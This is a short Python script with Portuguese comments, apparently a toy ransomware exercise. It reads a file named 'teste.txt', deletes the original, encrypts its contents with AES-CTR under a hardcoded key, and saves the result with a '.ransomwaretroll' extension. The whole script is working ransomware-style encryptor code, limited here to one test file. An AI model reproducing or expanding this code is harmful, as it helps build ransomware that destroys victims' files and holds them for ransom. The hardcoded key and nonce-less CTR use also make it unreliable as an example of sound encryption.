import os
import pyaes

## Abrir o arquivo a ser criptografado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## remover o arquivo original

os.remove(file_name)

## definir a chave de encriptação

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo

crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
